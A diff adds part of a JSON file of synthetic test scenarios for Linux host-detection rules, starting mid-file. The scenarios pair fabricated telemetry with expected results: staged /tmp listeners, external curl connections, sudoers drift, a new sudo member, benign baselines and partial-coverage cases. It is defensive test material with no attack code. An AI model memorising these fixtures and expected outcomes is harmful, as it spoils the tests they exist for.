+     }
+    ],
+    "coverage": {
+     "auth_event": "partial"
+    }
+   },
+   "expect": {
+    "indeterminate": [
+     {
+      "rule": "DR-ANY-HAUTH-001",
+      "reason_contains": "partial"
+     }
+    ],
+    "coverage": {
+     "auth_event": "partial"
+    }
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-NET-001",
+   "title": "Expected listening services",
+   "description": "sshd on 22 and a local resolver on 127.0.0.53, both from package directories.",
+   "objective": "Expected listeners are not flagged.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "network",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:100:1",
+      "attributes": {
+       "pid": 100,
+       "ppid": 1,
+       "name": "sshd",
+       "exe": "/usr/sbin/sshd",
+       "user": "root",
+       "cmdline": "sshd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:110:1",
+      "attributes": {
+       "pid": 110,
+       "ppid": 1,
+       "name": "systemd-resolved",
+       "exe": "/lib/systemd/systemd-resolved",
+       "user": "root",
+       "cmdline": "systemd-resolved"
+      }
+     },
+     {
+      "category": "listener",
+      "key": "l:0.0.0.0:22",
+      "attributes": {
+       "protocol": "tcp",
+       "local_address": "0.0.0.0",
+       "local_port": 22,
+       "pid": 100,
+       "process": "sshd"
+      }
+     },
+     {
+      "category": "listener",
+      "key": "l:127.0.0.53:53",
+      "attributes": {
+       "protocol": "tcp",
+       "local_address": "127.0.0.53",
+       "local_port": 53,
+       "pid": 110,
+       "process": "systemd-resolved"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HNET-001"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-NET-002",
+   "title": "Listener owned by a program in /tmp",
+   "description": "A program in /tmp accepts inbound connections on 8081.",
+   "objective": "HNET-001 correlates a non-loopback listener with a staged executable.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "network",
+    "correlation"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:200:1",
+      "attributes": {
+       "pid": 200,
+       "ppid": 1,
+       "name": "agent",
+       "exe": "/tmp/agent",
+       "user": "www-data",
+       "cmdline": "agent"
+      }
+     },
+     {
+      "category": "listener",
+      "key": "l:0.0.0.0:8081",
+      "attributes": {
+       "protocol": "tcp",
+       "local_address": "0.0.0.0",
+       "local_port": 8081,
+       "pid": 200,
+       "process": "agent"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HNET-001",
+      "count": 1,
+      "severity": {
+       "min": "high"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-NET-003",
+   "title": "New listening port since the baseline",
+   "description": "A new TCP listener on 9001.",
+   "objective": "HCHG-001 reports a new non-loopback listener.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "network",
+    "change"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "listener",
+      "key": "l:0.0.0.0:22",
+      "attributes": {
+       "protocol": "tcp",
+       "local_address": "0.0.0.0",
+       "local_port": 22,
+       "pid": 100,
+       "process": "sshd"
+      }
+     },
+     {
+      "category": "listener",
+      "key": "l:0.0.0.0:9001",
+      "attributes": {
+       "protocol": "tcp",
+       "local_address": "0.0.0.0",
+       "local_port": 9001,
+       "pid": 300,
+       "process": "exporter"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HCHG-001",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "listener",
+      "key": "l:0.0.0.0:22",
+      "attributes": {
+       "protocol": "tcp",
+       "local_address": "0.0.0.0",
+       "local_port": 22,
+       "pid": 100,
+       "process": "sshd"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-NET-004",
+   "title": "Listeners unchanged",
+   "description": "The same listener as the baseline.",
+   "objective": "No change detection when nothing changed.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "network",
+    "change",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "listener",
+      "key": "l:0.0.0.0:22",
+      "attributes": {
+       "protocol": "tcp",
+       "local_address": "0.0.0.0",
+       "local_port": 22,
+       "pid": 100,
+       "process": "sshd"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HCHG-001"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "listener",
+      "key": "l:0.0.0.0:22",
+      "attributes": {
+       "protocol": "tcp",
+       "local_address": "0.0.0.0",
+       "local_port": 22,
+       "pid": 100,
+       "process": "sshd"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-NET-005",
+   "title": "Normal local network activity",
+   "description": "A python service talks to the local database and a loopback cache; curl fetches from an internal mirror.",
+   "objective": "Local and internal connections do not trigger the external-connection rules.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "network",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "network_connection",
+      "key": "c:400:127.0.0.1:5432",
+      "attributes": {
+       "protocol": "tcp",
+       "state": "established",
+       "local_address": "10.0.0.5",
+       "local_port": 40400,
+       "remote_address": "127.0.0.1",
+       "remote_port": 5432,
+       "pid": 400,
+       "process": "python3"
+      }
+     },
+     {
+      "category": "network_connection",
+      "key": "c:410:10.0.0.50:443",
+      "attributes": {
+       "protocol": "tcp",
+       "state": "established",
+       "local_address": "10.0.0.5",
+       "local_port": 40410,
+       "remote_address": "10.0.0.50",
+       "remote_port": 443,
+       "pid": 410,
+       "process": "curl"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HNET-002"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-NET-006",
+   "title": "Downloader connecting to an external host",
+   "description": "curl holds an established connection to an external address.",
+   "objective": "HNET-002 reports an interpreter/downloader reaching outside.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "network"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "network_connection",
+      "key": "c:500:198.51.100.7:443",
+      "attributes": {
+       "protocol": "tcp",
+       "state": "established",
+       "local_address": "10.0.0.5",
+       "local_port": 40500,
+       "remote_address": "198.51.100.7",
+       "remote_port": 443,
+       "pid": 500,
+       "process": "curl"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HNET-002",
+      "count": 1,
+      "confidence": {
+       "max": "medium"
+      }
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "Package updates produce the same observation."
+   ]
+  },
+  {
+   "id": "SCN-LNX-NET-007",
+   "title": "Incomplete network inventory",
+   "description": "The collector could not resolve socket owners (coverage partial) and no connection matched.",
+   "objective": "A correlation rule over incomplete network data says it cannot conclude.",
+   "kind": "coverage",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "network",
+    "coverage",
+    "permissions"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     },
+     {
+      "category": "process",
+      "key": "pid:900:1",
+      "attributes": {
+       "pid": 900,
+       "ppid": 1,
+       "name": "bash",
+       "exe": "/usr/bin/bash",
+       "user": "root",
+       "cmdline": "bash"
+      }
+     },
+     {
+      "category": "network_connection",
+      "key": "c1",
+      "attributes": {
+       "protocol": "tcp",
+       "state": "established",
+       "local_address": "10.0.0.5",
+       "local_port": 40001,
+       "remote_address": "10.0.0.9",
+       "remote_port": 22,
+       "pid": null,
+       "process": null
+      },
+      "unknown_attributes": [
+       "pid",
+       "process"
+      ]
+     }
+    ],
+    "coverage": {
+     "network_connection": "partial"
+    }
+   },
+   "expect": {
+    "indeterminate": [
+     {
+      "rule": "DR-ANY-HPRC-004",
+      "reason_contains": "partial"
+     }
+    ],
+    "coverage": {
+     "network_connection": "partial"
+    }
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-NET-008",
+   "title": "Listener inventory unavailable",
+   "description": "/proc/net was not readable.",
+   "objective": "Rules that need listeners report that the inventory is missing.",
+   "kind": "coverage",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "network",
+    "coverage"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "process",
+      "key": "pid:1:1",
+      "attributes": {
+       "pid": 1,
+       "ppid": 0,
+       "name": "systemd",
+       "exe": "/usr/bin/systemd",
+       "user": "root",
+       "cmdline": "systemd"
+      }
+     }
+    ],
+    "coverage": {
+     "listener": "unavailable"
+    }
+   },
+   "expect": {
+    "indeterminate": [
+     {
+      "rule": "DR-ANY-HNET-001",
+      "reason_contains": "could not be collected"
+     }
+    ],
+    "coverage": {
+     "listener": "unavailable"
+    }
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ]
+  },
+  {
+   "id": "SCN-LNX-INT-001",
+   "title": "Expected configuration state",
+   "description": "Monitored files have the same hashes as the baseline.",
+   "objective": "An unchanged system produces no integrity detection.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "integrity",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/sudoers",
+      "attributes": {
+       "path": "/etc/sudoers",
+       "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+       "mode": "440"
+      }
+     },
+     {
+      "category": "integrity",
+      "key": "i:/etc/passwd",
+      "attributes": {
+       "path": "/etc/passwd",
+       "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+       "mode": "644"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HCHG-003"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/sudoers",
+      "attributes": {
+       "path": "/etc/sudoers",
+       "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+       "mode": "440"
+      }
+     },
+     {
+      "category": "integrity",
+      "key": "i:/etc/passwd",
+      "attributes": {
+       "path": "/etc/passwd",
+       "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+       "mode": "644"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-INT-002",
+   "title": "Configuration drift in sudoers",
+   "description": "The hash of /etc/sudoers differs from the baseline.",
+   "objective": "HCHG-003 reports drift of a monitored file as an indicator to review.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "integrity",
+    "change"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/sudoers",
+      "attributes": {
+       "path": "/etc/sudoers",
+       "sha256": "cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc",
+       "mode": "440"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HCHG-003",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "Whether the change was authorised is not knowable from the hash."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/sudoers",
+      "attributes": {
+       "path": "/etc/sudoers",
+       "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+       "mode": "440"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-INT-003",
+   "title": "Unmonitored file changed",
+   "description": "/etc/motd changed.",
+   "objective": "The monitored list is deliberate: other files do not trigger the rule.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "integrity",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/motd",
+      "attributes": {
+       "path": "/etc/motd",
+       "sha256": "dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd",
+       "mode": "644"
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HCHG-003"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/motd",
+      "attributes": {
+       "path": "/etc/motd",
+       "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+       "mode": "644"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-INT-004",
+   "title": "Privileged group gained a member",
+   "description": "sudo has an additional member.",
+   "objective": "HCHG-004 reports a change in privileged group membership.",
+   "kind": "positive",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "integrity",
+    "privilege",
+    "change"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "group",
+      "key": "g:sudo",
+      "attributes": {
+       "name": "sudo",
+       "members": [
+        "alice",
+        "mallory"
+       ]
+      }
+     }
+    ]
+   },
+   "expect": {
+    "detections": [
+     {
+      "rule": "DR-ANY-HCHG-004",
+      "count": 1
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "The rule reports that membership changed, not who was added."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "group",
+      "key": "g:sudo",
+      "attributes": {
+       "name": "sudo",
+       "members": [
+        "alice"
+       ]
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-INT-005",
+   "title": "Non-privileged group changed",
+   "description": "A project group gained a member.",
+   "objective": "Only privileged groups are in scope.",
+   "kind": "negative",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "integrity",
+    "benign"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "group",
+      "key": "g:project",
+      "attributes": {
+       "name": "project",
+       "members": [
+        "alice",
+        "bob"
+       ]
+      }
+     }
+    ]
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HCHG-004"
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "group",
+      "key": "g:project",
+      "attributes": {
+       "name": "project",
+       "members": [
+        "alice"
+       ]
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-INT-006",
+   "title": "Incomplete integrity information",
+   "description": "Hashes could not be taken (unreadable files): coverage is partial and the hash attribute is unknown.",
+   "objective": "Unknown hashes must not be read as 'unchanged'.",
+   "kind": "coverage",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "integrity",
+    "coverage",
+    "permissions"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/sudoers",
+      "attributes": {
+       "path": "/etc/sudoers",
+       "sha256": null,
+       "mode": "440"
+      },
+      "unknown_attributes": [
+       "sha256"
+      ]
+     }
+    ],
+    "coverage": {
+     "integrity": "partial"
+    }
+   },
+   "expect": {
+    "indeterminate": [
+     {
+      "rule": "DR-ANY-HCHG-003",
+      "reason_contains": "partial"
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/sudoers",
+      "attributes": {
+       "path": "/etc/sudoers",
+       "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+       "mode": "440"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "SCN-LNX-INT-007",
+   "title": "Monitored file missing",
+   "description": "A monitored file present in the baseline is absent now.",
+   "objective": "Documents a detection gap: removal of a monitored file produces no detection from the integrity rule.",
+   "kind": "coverage",
+   "platforms": [
+    "linux"
+   ],
+   "supported_versions": [
+    "any"
+   ],
+   "tags": [
+    "integrity",
+    "gap"
+   ],
+   "dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/passwd",
+      "attributes": {
+       "path": "/etc/passwd",
+       "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+       "mode": "644"
+      }
+     }
+    ],
+    "coverage": {
+     "integrity": "complete"
+    }
+   },
+   "expect": {
+    "absent": [
+     "DR-ANY-HCHG-003"
+    ],
+    "coverage": {
+     "integrity": "complete"
+    },
+    "telemetry": [
+     {
+      "category": "integrity",
+      "where": {
+       "field": "attrs.path",
+       "op": "eq",
+       "value": "/etc/sudoers"
+      },
+      "count": 0,
+      "description": "the file is not in the current telemetry"
+     }
+    ]
+   },
+   "cleanup": {
+    "required": false,
+    "description": "Synthetic dataset: nothing is created on any host."
+   },
+   "limitations": [
+    "Synthetic telemetry shaped like the Linux collector's output; it shows the rule's logic, not how a real host behaves.",
+    "GAP: no rule reports the disappearance of a monitored file; the telemetry comparison shows it as a removed record, but nothing turns that into a detection."
+   ],
+   "baseline_dataset": {
+    "platform": "linux",
+    "records": [
+     {
+      "category": "integrity",
+      "key": "i:/etc/passwd",
+      "attributes": {
+       "path": "/etc/passwd",
+       "sha256": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+       "mode": "644"
+      }
+     },
+     {
+      "category": "integrity",
+      "key": "i:/etc/sudoers",
+      "attributes": {
+       "path": "/etc/sudoers",
+       "sha256": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+       "mode": "440"
+      }
+     }
+    ]
+   }
+  }
+ ]
+}
